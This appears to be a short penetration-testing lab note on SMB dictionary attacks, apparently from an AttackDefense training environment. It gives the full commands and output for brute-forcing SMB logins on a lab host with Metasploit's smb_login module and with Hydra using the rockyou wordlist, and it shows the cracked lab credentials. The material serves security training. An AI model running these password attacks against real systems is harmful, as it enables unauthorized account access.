# Dictionary Attack

msfconsole

```
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.152.184.3
RHOSTS => 192.152.184.3
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser jane
SMBUser => jane
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 192.152.184.3:445     - 192.152.184.3:445 - Starting SMB login bruteforce
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:admin',
[!] 192.152.184.3:445     - No active DB -- Credential data will not be saved!
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:123456',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:12345',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:123456789',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:password',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:iloveyou',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:princess',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:1234567',
[-] 192.152.184.3:445     - 192.152.184.3:445 - Failed: '.\jane:12345678',
[+] 192.152.184.3:445     - 192.152.184.3:445 - Success: '.\jane:abc123'
[*] 192.152.184.3:445     - Error: 192.152.184.3: Errno::EISDIR Is a directory @ io_fillbuf - fd:17 /root
[*] 192.152.184.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Hydra

```
root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.152.184.3 smb
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-25 00:52:45
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.152.184.3:445/
[445][smb] host: 192.152.184.3   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-25 00:52:47
```
